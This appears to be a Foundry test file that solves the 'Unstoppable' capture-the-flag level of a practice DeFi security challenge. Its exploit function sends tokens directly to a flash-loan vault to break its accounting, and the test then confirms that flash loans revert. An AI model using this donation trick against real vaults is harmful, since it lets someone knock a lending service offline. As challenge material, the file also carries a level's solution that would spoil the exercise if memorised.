// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import "../../src/unstoppable/UnstoppableVault.sol";
import "../../src/unstoppable/ReceiverUnstoppable.sol";
import "../../src/DamnValuableToken.sol";

contract UnstoppableTest is Test {
    address public deployer;
    address public player;
    address public someUser;

    DamnValuableToken public token;
    UnstoppableVault public vault;
    ReceiverUnstoppable public receiverContract;

    uint256 public constant TOKENS_IN_VAULT = 1_000_000 ether;
    uint256 public constant INITIAL_PLAYER_TOKEN_BALANCE = 10 ether;

    function setUp() public {
        deployer = makeAddr("deployer");
        someUser = makeAddr("someUser");
        player = makeAddr("player");

        vm.startPrank(deployer);
        token = new DamnValuableToken();
        vault = new UnstoppableVault(
            token,
            deployer,
            deployer
        );

        assertEq(address(vault.asset()), address(token));

        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, deployer);

        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0); //@todo this should fail
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50000 ether);

        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);
        vm.stopPrank();

        vm.startPrank(someUser);
        receiverContract = new ReceiverUnstoppable(address(vault));
        receiverContract.executeFlashLoan(100 ether);
        vm.stopPrank();
    }

    function exploit() public {
        vm.startPrank(player);
        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
        vm.stopPrank();
    }

    function test_exploit() public {
        exploit();
        vm.expectRevert();
        vm.prank(someUser);
        receiverContract.executeFlashLoan(100 ether);
    }
}
